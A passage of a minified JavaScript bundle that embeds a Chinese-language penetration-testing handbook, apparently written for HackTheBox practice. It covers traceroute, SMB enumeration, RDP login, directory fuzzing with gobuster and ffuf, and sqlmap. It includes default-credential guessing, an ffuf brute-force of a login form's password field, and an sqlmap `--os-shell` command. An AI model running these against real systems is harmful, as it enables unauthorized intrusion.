\u4F3C\u4E4E\u5DF2\u4E1A\u52A1\u8F6C\u578B\uFF0C\u4E0D\u518D\u63D0\u4F9B\u670D\u52A1",rate:"\u73B0\u4E3A0\u4EF7\u503C\uFF0C\u539F\u4E3A\u9AD8\u4EF7\u503C\u3002\u9700\u8981\u6CE8\u518C\uFF1B\u4F7F\u7528\u865A\u5047\u8EAB\u4EFD\u6CE8\u518C\u8BD5\u7528\u540E\uFF0C\u53D1\u73B0\u5DF2\u4E1A\u52A1\u8F6C\u578B\uFF0C\u4E0D\u518D\u63D0\u4F9B\u300A\u5168\u7403\u8282\u70B9\u81EA\u7531\u6D4B\u901F\u300B\u670D\u52A1",opt:{outdated:!0}}]))))},{name:"\u3010IP\u8DF3\u8F6C\u3011\u3001\u3010\u8DEF\u7531\u3011\u3001\u3010\u8DEF\u7531\u8BCA\u65AD\u3011\u3001\u3010\u7F51\u7EDC\u62D3\u6251\u3011\u3001",steps:[{name:"\u3010traceroute\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("traceroute","	traceroute -I -m 255  <\u57DF\u540D\u3001IP\u5730\u5740>","		\u3010-I\u3011\uFF0C\u4F7F\u7528ICMP\u62A5\u6587\u53D1\u9001\u3002  \uFF08\u89E3\u51B3 Linux\u865A\u62DF\u673A\uFF0C\u5168\u662F\u661F\u53F7 \u7684\u95EE\u9898\uFF09","		\u3010-m\u3011\u8BBE\u7F6E\u6700\u5927\u7684\u3010hop\u8DF3\u3011\u6570","	\u6210\u529F\u4F8B\u5B50\uFF1A","		\u3010zhihu.com\u3011\u3001\u3010baidu.com\u3011",n.a.createElement(n.a.Fragment,null,"	","(",_("\u66F4\u591A\u7528\u6CD5\u4E86\u89E3","https://www.cnblogs.com/peida/archive/2013/03/07/2947326.html"),")")," "))},{name:"\u3010tracert\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("tracert \uFF08Windows\u4E0B\u6307\u4EE4\uFF0C\u5F88\u591A\u65F6\u5019\u6BD4\u3010traceroute\u3011\u66F4\u597D\u7528\uFF09","	tracert -h 255 -w 10000 <\u57DF\u540D\u3001IP\u5730\u5740>","		\u3010-h\u3011\u8BBE\u7F6E\u6700\u5927\u7684\u3010hop\u8DF3\u3011\u6570","		\u3010-w\u3011\u8BBE\u7F6E\u7B49\u5F85\u7684\u8D85\u65F6\u65F6\u95F4\u3002\uFF08\u4EE5\u6BEB\u79D2\u4E3A\u5355\u4F4D\uFF0C\u9ED8\u8BA4\u4E3A5\u79D2\uFF09","	\u6210\u529F\u4F8B\u5B50\uFF1A","		\u3010zhihu.com\u301118\u8DF3\u5DE6\u53F3\u3001\u3010baidu.com\u301119\u8DF3\u5DE6\u53F3"))},{name:"\u300A\u5728\u7EBF\u7F51\u7AD9\u300B\u2014\u2014\u3010\u8DEF\u7531\u8BCA\u65AD\u3011\u7ED8\u5236IP\u8DF3\u8F6C\u8DEF\u5F84\u3001\u5916\u90E8\u7F51\u7EDC\u62D3\u6251\u7ED3\u6784\u3001\u53D1\u73B0\u3010\u9632\u706B\u5899\u3011\u8FC7\u6EE4\u5668",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,(y=u.g.\u7EC4\u4EF6\u624B\u518C).\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E.apply(y,Object(l.a)(O([{href:"http://www.traceroute.org/",name:"\u5168\u7403\u5404\u5730TraceRoute\u7F51\u7AD9\u6536\u5F55 - \u5DF2\u8FC7\u65F6",rate:"\u65E0\u4EF7\u503C\u3002\u672C\u6765\u662F\u9AD8\u4EF7\u503C\uFF0C\u4F46\u90FD\u5DF2\u8FC7\u65F6\u4E86",opt:{outdated:!0}}]))))}]}]},r=B,P=f("B5J2"),p,z=k.e.singleATag_blank,N=k.e.tutorial.descLinks,K={name:"\u672A\u77E5\u3010\u7AEF\u53E3\u3011_\u5E38\u7528\u3010\u7AEF\u53E3\u3011_\u3010\u7AEF\u53E3\u3011\u67E5\u8BE2_\u624B\u518C",steps:[{name:"\u300A\u5728\u7EBF\u7F51\u7AD9\u300B\u2014\u2014\u5E38\u89C1\u7684\u5F00\u653E\u3010\u7AEF\u53E3\u3011\u6C47\u603B\u4FE1\u606F\u4E00\u89C8",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,(p=u.g.\u7EC4\u4EF6\u624B\u518C).\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E.apply(p,Object(l.a)(N([{href:"https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xml",name:"\u56FD\u9645 \u5DF2\u6CE8\u518C\u7684\u670D\u52A1\u548C\u7AEF\u53E3\u540D\uFF0C\u6C47\u603B",rate:"\u9AD8\u4EF7\u503C"}]))))}]},S=K,T=f("SeyV"),H=k.e.singleATag_blank,q={name:"\u3010SMB\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u7AEF\u53E3
              139
                  netbios-ssn

                  NetBIOS \u662F\u7F51\u7EDC\u57FA\u672C\u8F93\u5165/\u8F93\u51FA\u7CFB\u7EDF\u7684\u9996\u5B57\u6BCD\u7F29\u5199
                      Network Basic Input/Output System

                      \u4E00\u79CD\u5141\u8BB8\u5728\u5C40\u57DF\u7F51\u4E2D\u901A\u8FC7 OSI \u6A21\u578B\u7684\u4F1A\u8BDD\u5C42\u8FDB\u884C\u300A\u6587\u4EF6\u300B\u548C\u300A\u6253\u5370\u673A\u901A\u4FE1\u300B\u7684\u534F\u8BAE

              445
                  microsoft-ds?

          Server Message Block
              file sharing protocol \u6587\u4EF6\u5206\u4EAB\u534F\u8BAE


          Samba\uFF0C\u662F\u300Asmb\u534F\u8BAE\u300B\u7684\u5177\u4F53\u5B9E\u73B0\u4EA7\u54C1


          \u6743\u9650\uFF1A
              \u4E0D\u540C\u7684\u3010Share\u5206\u4EAB\u3011\uFF0C\u5BF9\u5E94\u7740\u4E0D\u540C\u7684\u3010\u7528\u6237\u6743\u9650\u3011

              \u54EA\u6015\uFF0C\u540C\u4E00\u4E2A\u3010Share\u5206\u4EAB\u3011
                  \u5728\u5176\u4E2D\u7684\u3010\u5B50\u6587\u4EF6\u5939\u3011\uFF0C\u4E5F\u5BF9\u5E94\u7740\u4E0D\u540C\u7684\u3010\u7528\u6237\u6743\u9650\u3011
                  \u6BCF\u4E2A\u7528\u6237\uFF0C\u770B\u5230\u7684\u3010\u76EE\u5F55\u5185\u5BB9\u3011\uFF0C\u4E5F\u4F1A\u4E0D\u4E00\u6837\u7684

              \u3010\u5217\u4E3E\u76EE\u5F55\u3011\u548C\u3010\u67E5\u770B\u6587\u4EF6\u3011\uFF0C\u4E0D\u662F\u540C\u4E00\u4E2A\u6743\u9650\u3002

              \u6709\u7684\u3010\u7236\u6587\u4EF6\u5939\u3011\u4E0D\u5141\u8BB8\u3010\u5217\u4E3E\u3011\uFF1B\u4F46\u7236\u4E4B\u4E0B\u7684\u3010\u5B50\u6587\u4EF6\u5939\u3011\u53C8\u5141\u8BB8\u3010\u5217\u4E3E\u3011\u3002

          `))},{name:"\u3010smbclient\u3011       \uFF08Linux\u5DE5\u5177\uFF09",desc:n.a.createElement(n.a.Fragment,null),content:Promise.all([Promise.resolve().then(f.bind(null,"SeyV"))]).then(function(sn){var mn=Object(E.a)(sn,1),Cn=mn[0];return n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u53C2\u8003\u8D44\u6599\uFF1Ahttps://linuxtect.com/linux-smbclient-command-tutorial/

          \u767B\u5F55
              smbclient  -L  <IP\u5730\u5740>
                  \u5217\u51FA\u300A\u76EE\u6807\u673A\u5668\u300B\uFF0C\u6240\u63D0\u4F9B\u7684\u5171\u4EAB

                      \u300A\u672B\u5C3E\u5E26$\u300B\uFF0C\u662F\u7CFB\u7EDF\u5185\u7F6E \u6216 \u9ED8\u8BA4\u7684share\u3002
                      \u300A\u4E0D\u5E26$\u300B\uFF0C\u5C31\u662F \u81EA\u5B9A\u4E49 \u7684share\u3002

                  \u5982\u679C\u63D0\u793A\u3010NT_STATUS_ACCESS_DENIED\u3011
                      \u5219\u53EF\u80FD\u9700\u8981\u300A-U\u300B\u5E26\u7528\u6237\uFF0C\u6765\u8FDB\u884C\u3010\u5217\u4E3E\u3011\u3002

              smbclient  "\\<IP\u5730\u5740><Share\u5BB9\u5668>"
                  \u5173\u4E8E\u300A\\\u300B\u7684\u4E2A\u6570
                      \u548C\u300A\u5177\u4F53\u64CD\u4F5C\u7CFB\u7EDF\u300B\u5E94\u8BE5\u662F\u6709\u5173\u7684\uFF0C\u5E73\u53F0\u5DEE\u5F02
                          Windows\u3001Linux\u3002
                      \u300A\\\u300B\u5982\u679C\u4E0D\u591F\uFF0C\u5C31\u7528\u300A\\\\\u300B
                          \u5230\u65F6\u5019\uFF0C\u547D\u4EE4\u884C\u4F1A\u6709\u63D0\u793A\u3002

                  \u7B2C\u4E00\u79CD\uFF0C\u76F4\u63A5\u767B\u5F55

                  \u7B2C\u4E8C\u79CD\uFF0C\u6307\u5B9A\u7528\u6237\u540D\u767B\u5F55
                      \u300A-U\u300B\uFF0C\u6307\u5B9A  \u767B\u5F55\u7528\u6237\u540D


          \u63D0\u793A\u8F93\u5165\u5BC6\u7801\uFF1A
              \u53EF\u4EE5\u5C1D\u8BD5\uFF0C\u76F4\u63A5\u3010\u56DE\u8F66\u3011\uFF0C\u5373\u65E0\u5BC6\u7801
              \u6216\u8005\u7528\u3010-N\u3011\u9009\u9879\u6307\u5B9A

          \u6BD4\u8F83\u5C11\u7528\u7684\u9009\u9879\uFF1A
              \u3010-N\u3011\uFF0C\u6307\u6CA1\u6709\u5BC6\u7801

          \u5E38\u89C1\u547D\u4EE4\uFF08\u767B\u5F55\u540E\uFF09

              \u57FA\u672C\u540C\u4E8E\u3010ftp\u3011\u3002

              allinfo   \u67E5\u770B\u6587\u4EF6\u5C5E\u6027
                `,u.g.\u7EC4\u4EF6\u624B\u518C.get\u6309\u94AE\u548C\u5F39\u51FA\u624B\u518C_\u6709\u65E0cfg\u7686\u53EF(Cn.FTP_\u624B\u518C),`

          \u53EF\u80FD\u7684\u4E00\u4E9B\u95EE\u9898\uFF1B
              \u62A5\u9519\u3010protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED\u3011
                  \u8D44\u6599\uFF1Ahttps://www.reddit.com/r/oscp/comments/fg956k/comment/fk41pgg/?utm_source=share&utm_medium=web2x&context=3
                  \u89E3\u51B3\u65B9\u6848\uFF1B
                      \u7B2C\u4E00\u79CD\uFF0C\u6DFB\u52A0\u3010client min protocol\u3011\u914D\u7F6E\u5373\u53EF
                      \u7B2C\u4E8C\u79CD\uFF0C\u5728\u547D\u4EE4\u884C\u4E2D\uFF0C\u6DFB\u52A0\u3010--option='client min protocol=NT1'\u3011\u3002
              \u62A5\u9519\u3010tree connect failed: NT_STATUS_ACCESS_DENIED\u3011
              \u62A5\u9519\u3010Error opening local file \u3011

                `))})},{name:"\u3010smbmount\u3011        \uFF08Linux\u5DE5\u5177\uFF09",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())},{name:"\u3010smbmap\u3011 / \u3010smbmap.py\u3011          \uFF08Linux\u5DE5\u5177\uFF09",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u547D\u4EE4\uFF1A
              smbmap  -H  <IP\u5730\u5740>  --no-banner
                  \u3010-H\u3011\uFF0C\u6307\u5B9A\u5730\u5740

              smbmap  -H  <IP\u5730\u5740>  -R  <\u5BF9\u5E94Share>  --no-banner
                  \u3010-R\u3011\uFF0C\u9012\u5F52\u7684\u5217\u51FA\u76EE\u5F55

          \u5E38\u89C1\u9009\u9879
              \u3010--download  <\u5F85\u4E0B\u8F7D\u6587\u4EF6\u8DEF\u5F84>\u3011

              \u3010-A  <\u901A\u914D\u7B26>\u3011\uFF0C\u4E0B\u8F7D\u5339\u914D\u7684\u5168\u90E8
                  \u66FF\u4EE3\u3010--download\u3011\u4F7F\u7528\u3002\u4E0B\u8F7D\u6240\u6709  \u6EE1\u8DB3\u901A\u914D\u7B26  \u7684\u6587\u4EF6\u3002
                  \u6BD4\u5982\uFF1A
                      \u3010-A  *\u3011\u3001\u3010-A  xml\u3011
          `))}]},G=q,ju=k.e.singleATag_blank,$={name:"\u3010RDP\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u8FDC\u7A0B\u684C\u9762\u534F\u8BAE
              Remote Desktop Protocol

          \u8001\u7248\u7684\u8FDC\u7A0B\u8BBF\u95EE\u5DE5\u5177\uFF0C\uFF08\u9ED8\u8BA4\u9009\u62E9\uFF09 telnet

          \u4F7F\u7528\u547D\u4EE4\u884C\u7EC8\u7AEF\uFF0C\u8FDB\u884C\u6295\u5F71
              rdesktop
              xfreerdp

          ms-wbt-server
              Windows Based Terminals

          Microsoft Terminal Services

          `))},{name:"\u8D26\u53F7\u5BC6\u7801",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
      \u4E0D\u6307\u5B9A\u8D26\u53F7\uFF0C\u4F7F\u7528\u300ADomain\u300B\u767B\u5F55
          \u53EF\u80FD\u5DF2\u7ECF\u5728\u300Anmap\u300B\u73AF\u8282\uFF0C\u626B\u63CF\u51FA\u6765\u4E86\u3002
              \u5728\u3010Domain\u3011\u76F8\u5173\u5B57\u6BB5\uFF0C\u5C31\u53EF\u4EE5\u770B\u51FA\u6765\uFF01\uFF01\uFF01
          \u4E5F\u53EF\u80FD\u5728\u3010xfreerdp\u3011\u63D0\u793A\u8F93\u5165\u7684\u4E0A\u4E00\u884C\uFF0C\u6709\u4E00\u4E2A\u300A\u8F93\u51FA\u65E5\u5FD7\u300B
              \u4ECE\u3010\u547D\u4EE4\u884C\u7684verbose\u3011\u4FE1\u606F\uFF0C\u5C31\u53EF\u4EE5\u770B\u51FA\u6765\uFF01\uFF01\uFF01

      \u624B\u52A8\u6307\u5B9A\u8D26\u53F7\uFF0C\u4E0D\u4F7F\u7528\u300ADomain\u300B

          \u9ED8\u8BA4\u8D26\u53F7\uFF1A
              Administrator

          \u5176\u5B83\u5E38\u7528\u8D26\u53F7\u540D\uFF1A
              admin \u3001 Administrator \u3001 root \u3001 user


      \u5BC6\u7801\uFF0C\u53EF\u4EE5\u5C1D\u8BD5\u300A\u9ED8\u8BA4\u65E0\u300B
          `))},{name:"\u3010xfreerdp\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
      \u53C2\u8003\u8D44\u6599\uFF1Ahttps://miloserdov.org/?p=4516

      \u767B\u5F55
          xfreerdp /v:<IP\u5730\u5740>[:PORT]

          xfreerdp /f /u:<\u7528\u6237\u540D> /p:<\u5BC6\u7801> /v:<IP\u5730\u5740>[:PORT]
              \u300A/f\u300B    \u4EE5\u5168\u5C4F\u6A21\u5F0F\u6253\u5F00\u8FDC\u7A0B\u684C\u9762
                  \u6709\u65F6\u5019\uFF0C\u82E5\u8FD9\u4E2A\u9009\u9879\u65E0\u6CD5\u6B63\u5E38\u5DE5\u4F5C\uFF0C\u53EF\u4EE5\u53BB\u6389\u8BE5\u9009\u9879\u3002
                      \u6BD4\u5982 HTB \u9776\u673A\u3002
              \u300A/u:\u300B   \u6307\u5B9A\u7528\u6237\u540D
                  \u9700\u8981\u6CE8\u610F\uFF0C\u6B64\u5904\u7684\u300A\u57DFDomain\u300B\u548C\u300A\u7528\u6237\u540Dusername\u300B\uFF0C\u901A\u5E38\u662F  \u4E0D\u53EF\u4E92\u6362\u7684\u3002
                      \u5404\u81EA\u6709\u72EC\u7ACB\u7684\u4F5C\u7528\u3002
              \u300APORT\u300B  \u7AEF\u53E3\u53EF\u9009

      \u9000\u51FA\u767B\u5F55
          \u975E\u5168\u5C4F\uFF0C\u76F4\u63A5\u5173\u95ED\u7A97\u53E3

          \u5168\u5C4F\uFF0C\u70B9\u51FB\u3010\u5F00\u59CB\u2014\u2014\u7528\u6237\u2014\u2014\u6CE8\u9500\u3011
          `))}]},au=$,uu=f("AkKX"),eu=k.e.singleATag_blank,iu={name:"\u3010Fuzz\u3011_\u3010\u6A21\u7CCA\u6D4B\u8BD5\u3011_\u624B\u518C",steps:[{name:"\u3010wfuzz\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u7528\u4F5C\u3010\u76EE\u5F55\u679A\u4E3E\u3011
              wfuzz  -w  <\u8BCD\u5178\u6587\u4EF6>  -t  64  --hc  404  http://10.10.10.171/FUZZ
                  \u3010-w\u3011
                  \u3010-t\u3011\uFF0C\u7EBF\u7A0B\u6570
                  \u3010--hc  <abc>\u3011
                      \u9690\u85CF\u6307\u5B9A\u3010\u72B6\u6001\u7801\u3011\u7684\u54CD\u5E94
                  \u3010--hl\u3011
                      \u540C\u4E0A\uFF0C\u9690\u85CFlines
                  \u3010--hw\u3011
                      \u540C\u4E0A\uFF0C\u9690\u85CFwords
                  \u3010--hh\u3011
                      \u540C\u4E0A\uFF0C\u9690\u85CFchars

          `))}]},hu=iu,Ru=k.e.singleATag_blank,un={name:"\u3010\u76EE\u5F55\u679A\u4E3E\u3011_\u624B\u518C",desc:n.a.createElement(n.a.Fragment,null,uu.a.\u4E0D\u4E8C\u6B21\u72AF\u9519_KEY.\u679A\u4E3E_\u539F\u7406_\u751F\u6548\u672C\u8D28),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
  directory busting
  Web Enumeration
          `))},{name:"\u3010gobuster\u3011",desc:n.a.createElement(n.a.Fragment,null),content:Promise.all([Promise.resolve().then(f.bind(null,"yEy/"))]).then(function(sn){var mn=Object(E.a)(sn,1),Cn=mn[0];return n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
      \u53C2\u8003\u8D44\u6599\uFF1A
          \u300A1.2\u300B\u7248\u672C\uFF1Ahttps://www.kali.org/tools/gobuster/
          \u300A3+\u300B\u7248\u672C\uFF1Ahttps://github.com/OJ/gobuster#dir-mode-options
          \u5B98\u65B9\uFF1Ahttps://github.com/OJ/gobuster

      \u626B\u63CF
          gobuster  dir  -e  -u  <Url\u5730\u5740>  -w  <\u8BCD\u5178\u4F4D\u7F6E>
              \u300A-e\u300B\uFF0C(\u62D3\u5C55\u5F00\u6765)\uFF0C\u6307\uFF0C\u6253\u5370 \u53D1\u73B0\u8DEF\u5F84 \u7684\u300A\u5B8C\u6574\u8DEF\u5F84\u300B\u3002
              \u300A-w\u300B\uFF0C\u6307\u5B9A\u8BCD\u5178\u4F4D\u7F6E

      \u5E38\u7528\u8BCD\u5178
`.concat(Cn.\u5E38\u7528\u8BCD\u5178_Helper.HTB_\u63D0\u4F9B\u8BCD\u5178,`

              `),u.g.\u7EC4\u4EF6\u624B\u518C.get\u6309\u94AE\u548C\u5F39\u51FA\u624B\u518C_\u6709\u65E0cfg\u7686\u53EF(Cn.\u8BCD\u5178_\u5BC6\u7801_\u53E3\u4EE4_\u7F16\u7801_\u7206\u7834_\u624B\u518C),`




      \u5E38\u89C1\u9009\u9879
          \u3010dir\u3011

              \u3010-e\u3011
                  \u89C1\u4E0A

              \u3010-x \u3001 --extensions\u3011
                  \u6587\u4EF6\u62D3\u5C55\u540D

              \u3010-c\u3001 --cookies\u3011
                  \u6307\u5B9A\u3010cookies\u3011\u503C\u3002

              \u3010-t\u3001 --threads\u3011
                  \u6307\u5B9A\u3010\u7EBF\u7A0B\u6570\u3011\u3002(\u9ED8\u8BA410)

              \u3010--wildcard\u3011
                  \u5F53\u9047\u5230\u3010\u901A\u914D\u7B26\u3011\u65F6\uFF0C\u4E5F\u5F3A\u5236\u7EE7\u7EED (\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F)

              \u3010-s\u3001 --status-codes\u3011
                  \u767D\u540D\u5355
                  \u6307\u5B9A\u3010\u76EE\u6807\u72B6\u6001\u7801\u3011\uFF0C\u5982\u3010"200,405"\u3011

                  \u5982\u679C\u8FD8\u662F\u4E0D\u884C\uFF0C\u5219\u53EF\u4EE5\u3010\u53CD\u5411\u8FC7\u6EE4\u3011\uFF1A
                        <\u539F\u547D\u4EE4>  |  grep -i "\\!405"

              \u3010-b\u3001 --status-codes-blacklist\u3011
                  \u9ED1\u540D\u5355
                  \u548C\u3010-s\u3011\uFF0C\u6548\u679C\u6B63\u597D\u76F8\u53CD

              \u3010-o\u3001 --output\u3011
                  \u6307\u5B9A\u62A5\u544A\u7684\u6587\u4EF6\u8DEF\u5F84

              \u3010-k\u3011
                  \uFF1F\uFF1F\uFF1F

            `))})},{name:"\u3010ffuf\u3011",desc:n.a.createElement(n.a.Fragment,null,"HTB\u7ED9\u51FA\u7684\u4E00\u4E2A\u65B0\u6B3E"),content:Promise.all([Promise.resolve().then(f.bind(null,"yEy/"))]).then(function(sn){var mn=Object(E.a)(sn,1),Cn=mn[0];return n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u53C2\u8003\u8D44\u6599\uFF1A
              \u5B98\u65B9\uFF1Ahttps://github.com/ffuf/ffuf

          \u4F7F\u7528\uFF1A

              \u76EE\u5F55\u626B\u63CF
                  ffuf  -u  <Url\u5E26\u5360\u4F4D\u7B26>
                      \u3010-u\u3011\uFF0C\u6307\u5B9A\u5730\u5740
                          \u5FC5\u987B\u4F7F\u7528\u3010\u5927\u5199FUZZ\u5360\u4F4D\u7B26\u3011

                  ffuf  -u  <Url\u5E26\u5360\u4F4D\u7B26>  -w  <\u8BCD\u5178\u5730\u5740>  -mc  <\u72B6\u6001\u7801>  -o  <\u8F93\u51FA\u6587\u4EF6\u8DEF\u5F84>
                      \u3010-w\u3011\uFF0C\u6307\u5B9A\u8BCD\u5178
                      \u3010-mc\u3011\uFF0C
                          \u5339\u914D\u72B6\u6001\u7801\uFF0C\u3010Match Code\u3011\u3002
                          \u9ED8\u8BA4\uFF1A\u3010200,204,301,302,307,401,403,405,500\u3011
                          \u6216\u8005\uFF0C\u3010all\u3011\u6307\u4EE3\u6240\u6709\u4E8B\u3002
                      \u3010-o\u3011\uFF0C\u8F93\u51FA\u6587\u4EF6

              \u865A\u62DF\u4E3B\u673A\u626B\u63CF
                  123

              GET\u53C2\u6570Fuzz
                  \u5BF9\u3010key\u3011
                      ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value -fs 4242

                  \u5BF9\u3010value\u3011
                      ffuf -w /path/to/values.txt -u https://target/script.php?valid_name=FUZZ -fc 401

              POST\u6570\u636EFuzz
                  ffuf -w /path/to/postdata.txt -X POST -d "username=admin\\&password=FUZZ" -u https://target/login.php -fc 401

          \u5E38\u7528\u8BCD\u5178
`.concat(Cn.\u5E38\u7528\u8BCD\u5178_Helper.HTB_\u63D0\u4F9B\u8BCD\u5178,`

              `),u.g.\u7EC4\u4EF6\u624B\u518C.get\u6309\u94AE\u548C\u5F39\u51FA\u624B\u518C_\u6709\u65E0cfg\u7686\u53EF(Cn.\u8BCD\u5178_\u5BC6\u7801_\u53E3\u4EE4_\u7F16\u7801_\u7206\u7834_\u624B\u518C),`

          \u4EA4\u4E92\u6A21\u5F0F
              \u6309\u4E0B\u3010Enter\u56DE\u8F66\u3011
                  \u8FDB\u7A0B\u6682\u505C\uFF0C\u8FDB\u5165 \u7C7B\u4F3Cshell \u7684\u3010\u4EA4\u4E92\u6A21\u5F0F\u3011\u3002

              \u7136\u540E\uFF0C\u8F93\u5165\u3010help\u3011\uFF0C\u67E5\u770B\u5E38\u7528\u4EA4\u4E92\u6307\u4EE4

          \u5E38\u89C1\u9009\u9879
              \u3010-c\u3011\uFF0C
                  \u5F69\u8272\u8F93\u51FA
              \u3010-H\u3011\uFF0C
                  \u8BBE\u7F6E\u3010Header\u3011\u8BF7\u6C42\u5934
              \u3010-fs\u3011\uFF0C
                  \u8FC7\u6EE4\u8FD4\u56DE\u5927\u5C0F\uFF0C\u3010Filter Size\u3011
              \u3010-maxtime\u3011\uFF0C
                  \u4E3A\u3010\u6574\u4E2A\u8FC7\u7A0B\u3011\uFF0C\u8BBE\u7F6E\u3010\u6700\u957F\u6267\u884C\u65F6\u95F4\u3011
              \u3010-maxtime-job\u3011\uFF0C
                  \u4E3A\u3010\u9012\u5F52\u3011\u7684\u3010\u6BCF\u4E2A\u5355\u72EC\u4F5C\u4E1A\u3011\uFF0C\u8BBE\u7F6E\u3010\u6700\u957F\u6267\u884C\u65F6\u95F4\u3011
              \u3010-config\u3011
                  \u6307\u5B9A\u3010\u914D\u7F6E\u6587\u4EF6\u3011

              \u3010-recursion\u3011
                  \u9012\u5F52\u626B\u63CF\uFF0C\u8981\u6C42\u3010url\u3011\u4EE5\u3010\u5927\u5199FUZZ\u5360\u4F4D\u7B26\u3011\u7ED3\u5C3E\u3002
              \u3010-recursion-depth\u3011
                  \u9012\u5F52\u6700\u5927\u6DF1\u5EA6\u3002
              \u3010-recursion-strategy\u3011
                  \u9012\u5F52\u7B56\u7565\u3002

          `))})},{name:"\u3010DirBuster\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u4ECB\u7ECD\uFF1A
              \u4E00\u6B3E\u53EF\u89C6\u5316\u5DE5\u5177\u3002\u4E5F\u6709\u8BF8\u591A\u9009\u9879\u3002
                  `))},{name:"\u3010BurpSuite\u3011 \u7684 \u3010Proxy\u3011\uFF0C\u3010\u88AB\u52A8\u722C\u866B\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u6709\u65F6\u5019\uFF0C\u867D\u7136\u5E76\u4E0D\u80FD\u3010\u76F4\u63A5\u547D\u4E2D\u76EE\u5F55\u3011\uFF1B\u4F46\u4F1A\u3010\u56E0\u4E3A\u5176\u5B83\u6587\u4EF6\u3011\u63ED\u793A\u51FA\u3010\u5DF2\u5B58\u5728\u76EE\u5F55\u3011

              \u6BD4\u5982\uFF0C\u7531\u3010/cdn-cgi/login/script.js\u3011\u6587\u4EF6\uFF0C\u5F15\u51FA\u3010/cdn-cgi/login/\u3011\u76EE\u5F55
                  \u5E76\u7531\u6B64\uFF0C\u8BBF\u95EE\u3010/cdn-cgi/login/index.php\u3011

          `))},hu,{name:"\u3010dirb\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          dirb
              dirb  <url\u5730\u5740>

          `))}]},fn=un,nn=k.e.singleATag_blank,Ku=u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              \u8FDE\u63A5shell
                  sqlmap  -u  <\u63A5\u53E3url>  --cookie="cookie\u6587\u672C\u5BF9"  --os-shell
                      1.\u76F4\u63A5\u8FDE\u4E0A\u3010\u7CFB\u7EDFshell\u3011\u3002
                      2.\u9700\u8981\u63D0\u4F9B\u3010\u540E\u53F0\u5F00\u53D1\u8BED\u8A00\u3011\u7684\u4FE1\u606F
                          1. asp\u3001aspx\u3001jsp\u3001php\uFF0C\u7B49\u7B49
